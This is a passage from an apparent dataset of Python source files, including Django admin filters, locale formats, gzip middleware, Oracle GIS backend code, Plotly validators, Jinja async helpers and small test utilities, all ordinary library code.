        return {'metadata': {}}

    @classmethod
    def merge_dicts(cls, *dict_args):
        # Because this is annoying to do inline
        outcome = {}
        for d in dict_args:
            outcome.update(d)
        return outcome"
JY81	JY81-filter.py	"# -*- coding: utf-8 -*-
from django.contrib.admin import FieldListFilter
from django.contrib.admin.utils import prepare_lookup_value
from django.utils.translation import gettext_lazy as _


class NullFieldListFilter(FieldListFilter):
    def __init__(self, field, request, params, model, model_admin, field_path):
        self.lookup_kwarg = '{0}__isnull'.format(field_path)
        super().__init__(field, request, params, model, model_admin, field_path)
        lookup_choices = self.lookups(request, model_admin)
        self.lookup_choices = () if lookup_choices is None else list(lookup_choices)

    def expected_parameters(self):
        return [self.lookup_kwarg]

    def value(self):
        return self.used_parameters.get(self.lookup_kwarg, None)

    def lookups(self, request, model_admin):
        return (
            ('1', _('Yes')),
            ('0', _('No')),
        )

    def choices(self, cl):
        yield {
            'selected': self.value() is None,
            'query_string': cl.get_query_string({}, [self.lookup_kwarg]),
            'display': _('All'),
        }
        for lookup, title in self.lookup_choices:
            yield {
                'selected': self.value() == prepare_lookup_value(self.lookup_kwarg, lookup),
                'query_string': cl.get_query_string({
                    self.lookup_kwarg: lookup,
                }, []),
                'display': title,
            }

    def queryset(self, request, queryset):
        if self.value() is not None:
            kwargs = {self.lookup_kwarg: self.value()}
            return queryset.filter(**kwargs)
        return queryset


class NotNullFieldListFilter(NullFieldListFilter):
    def lookups(self, request, model_admin):
        return (
            ('0', _('Yes')),
            ('1', _('No')),
        )"
JY150	JY150-validation.py	"""""""
Validator for a regular language.
""""""
from typing import Dict

from prompt_toolkit.document import Document
from prompt_toolkit.validation import ValidationError, Validator

from .compiler import _CompiledGrammar

__all__ = [
    ""GrammarValidator"",
]


class GrammarValidator(Validator):
    """"""
    Validator which can be used for validation according to variables in
    the grammar. Each variable can have its own validator.

    :param compiled_grammar: `GrammarCompleter` instance.
    :param validators: `dict` mapping variable names of the grammar to the
                       `Validator` instances to be used for each variable.
    """"""

    def __init__(
        self, compiled_grammar: _CompiledGrammar, validators: Dict[str, Validator]
    ) -> None:

        self.compiled_grammar = compiled_grammar
        self.validators = validators

    def validate(self, document: Document) -> None:
        # Parse input document.
        # We use `match`, not `match_prefix`, because for validation, we want
        # the actual, unambiguous interpretation of the input.
        m = self.compiled_grammar.match(document.text)

        if m:
            for v in m.variables():
                validator = self.validators.get(v.varname)

                if validator:
                    # Unescape text.
                    unwrapped_text = self.compiled_grammar.unescape(v.varname, v.value)

                    # Create a document, for the completions API (text/cursor_position)
                    inner_document = Document(unwrapped_text, len(unwrapped_text))

                    try:
                        validator.validate(inner_document)
                    except ValidationError as e:
                        raise ValidationError(
                            cursor_position=v.start + e.cursor_position,
                            message=e.message,
                        ) from e
        else:
            raise ValidationError(
                cursor_position=len(document.text), message=""Invalid command""
            )"
JY432	JY432-async_utils.py	"import inspect
import typing as t
from functools import wraps

from .utils import _PassArg
from .utils import pass_eval_context

V = t.TypeVar(""V"")


def async_variant(normal_func):  # type: ignore
    def decorator(async_func):  # type: ignore
        pass_arg = _PassArg.from_obj(normal_func)
        need_eval_context = pass_arg is None

        if pass_arg is _PassArg.environment:

            def is_async(args: t.Any) -> bool:
                return t.cast(bool, args[0].is_async)

        else:

            def is_async(args: t.Any) -> bool:
                return t.cast(bool, args[0].environment.is_async)

        @wraps(normal_func)
        def wrapper(*args, **kwargs):  # type: ignore
            b = is_async(args)

            if need_eval_context:
                args = args[1:]

            if b:
                return async_func(*args, **kwargs)

            return normal_func(*args, **kwargs)

        if need_eval_context:
            wrapper = pass_eval_context(wrapper)

        wrapper.jinja_async_variant = True
        return wrapper

    return decorator


_common_primitives = {int, float, bool, str, list, dict, tuple, type(None)}


async def auto_await(value: t.Union[t.Awaitable[""V""], ""V""]) -> ""V"":
    # Avoid a costly call to isawaitable
    if type(value) in _common_primitives:
        return t.cast(""V"", value)

    if inspect.isawaitable(value):
        return await t.cast(""t.Awaitable[V]"", value)

    return t.cast(""V"", value)


async def auto_aiter(
    iterable: ""t.Union[t.AsyncIterable[V], t.Iterable[V]]"",
) -> ""t.AsyncIterator[V]"":
    if hasattr(iterable, ""__aiter__""):
        async for item in t.cast(""t.AsyncIterable[V]"", iterable):
            yield item
    else:
        for item in t.cast(""t.Iterable[V]"", iterable):
            yield item


async def auto_to_list(
    value: ""t.Union[t.AsyncIterable[V], t.Iterable[V]]"",
) -> t.List[""V""]:
    return [x async for x in auto_aiter(value)]"
JY82	JY82-dummy.py	"import string

from django.core.exceptions import ImproperlyConfigured
from django.template import Origin, TemplateDoesNotExist
from django.utils.html import conditional_escape

from .base import BaseEngine
from .utils import csrf_input_lazy, csrf_token_lazy


class TemplateStrings(BaseEngine):
    app_dirname = ""template_strings""

    def __init__(self, params):
        params = params.copy()
        options = params.pop(""OPTIONS"").copy()
        if options:
            raise ImproperlyConfigured(""Unknown options: {}"".format("", "".join(options)))
        super().__init__(params)

    def from_string(self, template_code):
        return Template(template_code)

    def get_template(self, template_name):
        tried = []
        for template_file in self.iter_template_filenames(template_name):
            try:
                with open(template_file, encoding=""utf-8"") as fp:
                    template_code = fp.read()
            except FileNotFoundError:
                tried.append(
                    (
                        Origin(template_file, template_name, self),
                        ""Source does not exist"",
                    )
                )
            else:
                return Template(template_code)
        raise TemplateDoesNotExist(template_name, tried=tried, backend=self)


class Template(string.Template):
    def render(self, context=None, request=None):
        if context is None:
            context = {}
        else:
            context = {k: conditional_escape(v) for k, v in context.items()}
        if request is not None:
            context[""csrf_input""] = csrf_input_lazy(request)
            context[""csrf_token""] = csrf_token_lazy(request)
        return self.safe_substitute(context)"
JD119	JD119-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'Y년 n월 j일'
TIME_FORMAT = 'A g:i'
DATETIME_FORMAT = 'Y년 n월 j일 g:i A'
YEAR_MONTH_FORMAT = 'Y년 n월'
MONTH_DAY_FORMAT = 'n월 j일'
SHORT_DATE_FORMAT = 'Y-n-j.'
SHORT_DATETIME_FORMAT = 'Y-n-j H:i'
# FIRST_DAY_OF_WEEK =

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',  # '2006-10-25', '10/25/2006', '10/25/06'
    # '%b %d %Y', '%b %d, %Y',            # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',            # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',            # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',            # '25 October 2006', '25 October, 2006'
    '%Y년 %m월 %d일',                   # '2006년 10월 25일', with localized suffix.
]
TIME_INPUT_FORMATS = [
    '%H:%M:%S',     # '14:30:59'
    '%H:%M:%S.%f',  # '14:30:59.000200'
    '%H:%M',        # '14:30'
    '%H시 %M분 %S초',   # '14시 30분 59초'
    '%H시 %M분',        # '14시 30분'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'

    '%Y년 %m월 %d일 %H시 %M분 %S초',  # '2006년 10월 25일 14시 30분 59초'
    '%Y년 %m월 %d일 %H시 %M분',       # '2006년 10월 25일 14시 30분'
]

DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
JD386	JD386-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnel"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY237	JY237-test_version_compare.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

from viktor._vendor.libcst._parser.grammar import _should_include
from viktor._vendor.libcst._parser.parso.utils import PythonVersionInfo
from viktor._vendor.libcst.testing.utils import data_provider, UnitTest


class VersionCompareTest(UnitTest):
    @data_provider(
        (
            # Simple equality
            (""==3.6"", PythonVersionInfo(3, 6), True),
            (""!=3.6"", PythonVersionInfo(3, 6), False),
            # Equal or GT/LT
            ("">=3.6"", PythonVersionInfo(3, 5), False),
            ("">=3.6"", PythonVersionInfo(3, 6), True),
            ("">=3.6"", PythonVersionInfo(3, 7), True),
            (""<=3.6"", PythonVersionInfo(3, 5), True),
            (""<=3.6"", PythonVersionInfo(3, 6), True),
            (""<=3.6"", PythonVersionInfo(3, 7), False),
            # GT/LT
            ("">3.6"", PythonVersionInfo(3, 5), False),
            ("">3.6"", PythonVersionInfo(3, 6), False),
            ("">3.6"", PythonVersionInfo(3, 7), True),
            (""<3.6"", PythonVersionInfo(3, 5), True),
            (""<3.6"", PythonVersionInfo(3, 6), False),
            (""<3.6"", PythonVersionInfo(3, 7), False),
            # Multiple checks
            ("">3.6,<3.8"", PythonVersionInfo(3, 6), False),
            ("">3.6,<3.8"", PythonVersionInfo(3, 7), True),
            ("">3.6,<3.8"", PythonVersionInfo(3, 8), False),
        )
    )
    def test_tokenize(
        self,
        requested_version: str,
        actual_version: PythonVersionInfo,
        expected_result: bool,
    ) -> None:
        self.assertEqual(
            _should_include(requested_version, actual_version), expected_result
        )"
JD222	JD222-_locales.py	"""""""Provide class for testing in French locale

""""""
import sys
import locale

import pytest

__ALL__ = ['CommaDecimalPointLocale']


def find_comma_decimal_point_locale():
    """"""See if platform has a decimal point as comma locale.

    Find a locale that uses a comma instead of a period as the
    decimal point.

    Returns
    -------
    old_locale: str
        Locale when the function was called.
    new_locale: {str, None)
        First French locale found, None if none found.

    """"""
    if sys.platform == 'win32':
        locales = ['FRENCH']
    else:
        locales = ['fr_FR', 'fr_FR.UTF-8', 'fi_FI', 'fi_FI.UTF-8']

    old_locale = locale.getlocale(locale.LC_NUMERIC)
    new_locale = None
    try:
        for loc in locales:
            try:
                locale.setlocale(locale.LC_NUMERIC, loc)
                new_locale = loc
                break
            except locale.Error:
                pass
    finally:
        locale.setlocale(locale.LC_NUMERIC, locale=old_locale)
    return old_locale, new_locale


class CommaDecimalPointLocale:
    """"""Sets LC_NUMERIC to a locale with comma as decimal point.

    Classes derived from this class have setup and teardown methods that run
    tests with locale.LC_NUMERIC set to a locale where commas (',') are used as
    the decimal point instead of periods ('.'). On exit the locale is restored
    to the initial locale. It also serves as context manager with the same
    effect. If no such locale is available, the test is skipped.

    .. versionadded:: 1.15.0

    """"""
    (cur_locale, tst_locale) = find_comma_decimal_point_locale()

    def setup(self):
        if self.tst_locale is None:
            pytest.skip(""No French locale available"")
        locale.setlocale(locale.LC_NUMERIC, locale=self.tst_locale)

    def teardown(self):
        locale.setlocale(locale.LC_NUMERIC, locale=self.cur_locale)

    def __enter__(self):
        if self.tst_locale is None:
            pytest.skip(""No French locale available"")
        locale.setlocale(locale.LC_NUMERIC, locale=self.tst_locale)

    def __exit__(self, type, value, traceback):
        locale.setlocale(locale.LC_NUMERIC, locale=self.cur_locale)"
JY498	JY498-sync-device_class.py	"#!/usr/bin/env python3

import re

from homeassistant.components.binary_sensor import BinarySensorDeviceClass
from homeassistant.components.button import ButtonDeviceClass
from homeassistant.components.cover import CoverDeviceClass
from homeassistant.components.number import NumberDeviceClass
from homeassistant.components.sensor import SensorDeviceClass
from homeassistant.components.switch import SwitchDeviceClass

BLOCKLIST = (
    # requires special support on HA side
    ""enum"",
)

DOMAINS = {
    ""binary_sensor"": BinarySensorDeviceClass,
    ""button"": ButtonDeviceClass,
    ""cover"": CoverDeviceClass,
    ""number"": NumberDeviceClass,
    ""sensor"": SensorDeviceClass,
    ""switch"": SwitchDeviceClass,
}


def sub(path, pattern, repl):
    with open(path, ""r"") as handle:
        content = handle.read()
    content = re.sub(pattern, repl, content, flags=re.MULTILINE, count=1)
    with open(path, ""w"") as handle:
        handle.write(content)


def main():
    classes = {""EMPTY"": """"}
    allowed = {}

    for domain, enum in DOMAINS.items():
        available = {
            cls.value.upper(): cls.value for cls in enum if cls.value not in BLOCKLIST
        }

        classes.update(available)
        allowed[domain] = list(available.keys()) + [""EMPTY""]

    # replace constant defines in const.py
    out = """"
    for cls in sorted(classes):
        out += f'DEVICE_CLASS_{cls.upper()} = ""{classes[cls]}""\n'
    sub(""esphome/const.py"", '(DEVICE_CLASS_\w+ = ""\w*""\r?\n)+', out)

    for domain in sorted(allowed):
        # replace imports
        out = """"
        for item in sorted(allowed[domain]):
            out += f""    DEVICE_CLASS_{item.upper()},\n""

        sub(
            f""esphome/components/{domain}/__init__.py"",
            ""(    DEVICE_CLASS_\w+,\r?\n)+"",
            out,
        )


if __name__ == ""__main__"":
    main()"
JY441	JY441-admin.py	"# Copyright (C) 2017-2023 The Sipwise Team - http://sipwise.com
#
# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
# more details.
#
# You should have received a copy of the GNU General Public License along
# with this program.  If not, see <http://www.gnu.org/licenses/>.
from django.contrib import admin
from import_export import resources
from import_export.admin import ExportActionModelAdmin
from import_export.admin import ImportExportModelAdmin

from . import models


class BuildReleaseResource(resources.ModelResource):
    class Meta:
        model = models.BuildRelease


@admin.register(models.BuildRelease)
class BuildReleaseAdmin(ImportExportModelAdmin, ExportActionModelAdmin):
    resource_class = BuildReleaseResource
    list_filter = (""release"",)
    readonly_fields = (
        ""projects"",
        ""triggered_projects"",
        ""built_projects"",
        ""failed_projects"",
        ""pool_size"",
        ""triggered_jobs"",
        ""build_deps"",
    )
    modify_readonly_fields = (
        ""uuid"",
        ""release"",
    ) + readonly_fields

    def get_readonly_fields(self, request, obj=None):
        if obj is None:
            return self.readonly_fields
        return self.modify_readonly_fields

    def save_model(self, request, obj, form, change):
        if change:
            super(BuildReleaseAdmin, self).save_model(
                request, obj, form, change
            )
        else:
            new_obj = models.BuildRelease.objects.create_build_release(
                uuid=obj.uuid, release=obj.release
            )
            obj.pk = new_obj.pk"
JY165	JY165-convert.py	"""""""Code for converting notebooks to and from the v2 format.

Authors:

* Brian Granger
* Jonathan Frederic
""""""

# -----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

from .nbbase import new_code_cell, new_notebook, new_text_cell, new_worksheet

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


def upgrade(nb, from_version=1):
    """"""Convert a notebook to the v2 format.

    Parameters
    ----------
    nb : NotebookNode
        The Python representation of the notebook to convert.
    from_version : int
        The version of the notebook to convert from.
    """"""
    if from_version == 1:
        newnb = new_notebook()
        ws = new_worksheet()
        for cell in nb.cells:
            if cell.cell_type == ""code"":
                newcell = new_code_cell(
                    input=cell.get(""code""), prompt_number=cell.get(""prompt_number"")
                )
            elif cell.cell_type == ""text"":
                newcell = new_text_cell(""markdown"", source=cell.get(""text""))
            ws.cells.append(newcell)
        newnb.worksheets.append(ws)
        return newnb
    else:
        raise ValueError(""Cannot convert a notebook from v%s to v2"" % from_version)


def downgrade(nb):
    """"""Convert a v2 notebook to v1.

    Parameters
    ----------
    nb : NotebookNode
        The Python representation of the notebook to convert.
    """"""
    raise Exception(""Downgrade from notebook v2 to v1 is not supported."")"
JY536	JY536-_insidetextfont.py	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""bar"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY140	JY140-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'd. F Y'
TIME_FORMAT = 'H:i'
DATETIME_FORMAT = 'j. F Y. H:i'
YEAR_MONTH_FORMAT = 'F Y'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = 'j. M. Y'
SHORT_DATETIME_FORMAT = 'j.n.Y. H:i'
FIRST_DAY_OF_WEEK = 0

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d.%m.%Y', '%d.%m.%y',         # '25.10.2006', '25.10.06'
    '%d-%m-%Y',                     # '25-10-2006'
    '%d. %m. %Y', '%d. %m. %y',     # '25. 10. 2006', '25. 10. 06'
]

DATETIME_INPUT_FORMATS = [
    '%d.%m.%Y %H:%M:%S',            # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',         # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',               # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',            # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',         # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',                # '25.10.06 14:30'
    '%d-%m-%Y %H:%M:%S',            # '25-10-2006 14:30:59'
    '%d-%m-%Y %H:%M:%S.%f',         # '25-10-2006 14:30:59.000200'
    '%d-%m-%Y %H:%M',               # '25-10-2006 14:30'
    '%d. %m. %Y %H:%M:%S',          # '25. 10. 2006 14:30:59'
    '%d. %m. %Y %H:%M:%S.%f',       # '25. 10. 2006 14:30:59.000200'
    '%d. %m. %Y %H:%M',             # '25. 10. 2006 14:30'
    '%d. %m. %y %H:%M:%S',          # '25. 10. 06 14:30:59'
    '%d. %m. %y %H:%M:%S.%f',       # '25. 10. 06 14:30:59.000200'
    '%d. %m. %y %H:%M',             # '25. 10. 06 14:30'
]

DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JD94	JD94-gzip.py	"from django.utils.cache import patch_vary_headers
from django.utils.deprecation import MiddlewareMixin
from django.utils.regex_helper import _lazy_re_compile
from django.utils.text import compress_sequence, compress_string

re_accepts_gzip = _lazy_re_compile(r'\bgzip\b')


class GZipMiddleware(MiddlewareMixin):
    """"""
    Compress content if the browser allows gzip compression.
    Set the Vary header accordingly, so that caches will base their storage
    on the Accept-Encoding header.
    """"""
    def process_response(self, request, response):
        # It's not worth attempting to compress really short responses.
        if not response.streaming and len(response.content) < 200:
            return response

        # Avoid gzipping if we've already got a content-encoding.
        if response.has_header('Content-Encoding'):
            return response

        patch_vary_headers(response, ('Accept-Encoding',))

        ae = request.META.get('HTTP_ACCEPT_ENCODING', '')
        if not re_accepts_gzip.search(ae):
            return response

        if response.streaming:
            # Delete the `Content-Length` header for streaming content, because
            # we won't know the compressed size until we stream it.
            response.streaming_content = compress_sequence(response.streaming_content)
            del response['Content-Length']
        else:
            # Return the compressed content only if it's actually shorter.
            compressed_content = compress_string(response.content)
            if len(compressed_content) >= len(response.content):
                return response
            response.content = compressed_content
            response['Content-Length'] = str(len(response.content))

        # If there is a strong ETag, make it weak to fulfill the requirements
        # of RFC 7232 section-2.1 while also allowing conditional request
        # matches on ETags.
        etag = response.get('ETag')
        if etag and etag.startswith('""'):
            response['ETag'] = 'W/' + etag
        response['Content-Encoding'] = 'gzip'

        return response"
JY561	JY561-introspection.py	"import cx_Oracle

from django.db.backends.oracle.introspection import DatabaseIntrospection
from django.utils.functional import cached_property


class OracleIntrospection(DatabaseIntrospection):
    # Associating any OBJECTVAR instances with GeometryField. This won't work
    # right on Oracle objects that aren't MDSYS.SDO_GEOMETRY, but it is the
    # only object type supported within Django anyways.
    @cached_property
    def data_types_reverse(self):
        return {
            **super().data_types_reverse,
            cx_Oracle.OBJECT: 'GeometryField',
        }

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # Querying USER_SDO_GEOM_METADATA to get the SRID and dimension information.
            try:
                cursor.execute(
                    'SELECT ""DIMINFO"", ""SRID"" FROM ""USER_SDO_GEOM_METADATA"" '
                    'WHERE ""TABLE_NAME""=%s AND ""COLUMN_NAME""=%s',
                    (table_name.upper(), description.name.upper())
                )
                row = cursor.fetchone()
            except Exception as exc:
                raise Exception(
                    'Could not find entry in USER_SDO_GEOM_METADATA '
                    'corresponding to ""%s"".""%s""' % (table_name, description.name)
                ) from exc

            # TODO: Research way to find a more specific geometry field type for
            # the column's contents.
            field_type = 'GeometryField'

            # Getting the field parameters.
            field_params = {}
            dim, srid = row
            if srid != 4326:
                field_params['srid'] = srid
            # Size of object array (SDO_DIM_ARRAY) is number of dimensions.
            dim = dim.size()
            if dim != 2:
                field_params['dim'] = dim
        return field_type, field_params"
JY409	JY409-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""choropleth.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY559	JY559-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the Oracle spatial
 backend.

 It should be noted that Oracle Spatial does not have database tables
 named according to the OGC standard, so the closest analogs are used.
 For example, the `USER_SDO_GEOM_METADATA` is used for the GeometryColumns
 model and the `SDO_COORD_REF_SYS` is used for the SpatialRefSys model.
""""""
from django.contrib.gis.db import models
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin


class OracleGeometryColumns(models.Model):
    ""Maps to the Oracle USER_SDO_GEOM_METADATA table.""
    table_name = models.CharField(max_length=32)
    column_name = models.CharField(max_length=1024)
    srid = models.IntegerField(primary_key=True)
    # TODO: Add support for `diminfo` column (type MDSYS.SDO_DIM_ARRAY).

    class Meta:
        app_label = 'gis'
        db_table = 'USER_SDO_GEOM_METADATA'
        managed = False

    def __str__(self):
        return '%s - %s (SRID: %s)' % (self.table_name, self.column_name, self.srid)

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'column_name'


class OracleSpatialRefSys(models.Model, SpatialRefSysMixin):
    ""Maps to the Oracle MDSYS.CS_SRS table.""
    cs_name = models.CharField(max_length=68)
    srid = models.IntegerField(primary_key=True)
    auth_srid = models.IntegerField()
    auth_name = models.CharField(max_length=256)
    wktext = models.CharField(max_length=2046)
    # Optional geometry representing the bounds of this coordinate
    # system.  By default, all are NULL in the table.
    cs_bounds = models.PolygonField(null=True)

    class Meta:
        app_label = 'gis'
        db_table = 'CS_SRS'
        managed = False

    @property
    def wkt(self):
        return self.wktext"
JY408	JY408-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""choroplethmapbox.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY374	JY374-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""funnelarea"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY421	JY421-vincent_renderer.py	"import warnings
from .base import Renderer
from ..exporter import Exporter


class VincentRenderer(Renderer):
    def open_figure(self, fig, props):
        self.chart = None
        self.figwidth = int(props[""figwidth""] * props[""dpi""])
        self.figheight = int(props[""figheight""] * props[""dpi""])

    def draw_line(self, data, coordinates, style, label, mplobj=None):
        import vincent  # only import if VincentRenderer is used

        if coordinates != ""data"":
            warnings.warn(""Only data coordinates supported. Skipping this"")
        linedata = {""x"": data[:, 0], ""y"": data[:, 1]}
        line = vincent.Line(
            linedata, iter_idx=""x"", width=self.figwidth, height=self.figheight
        )

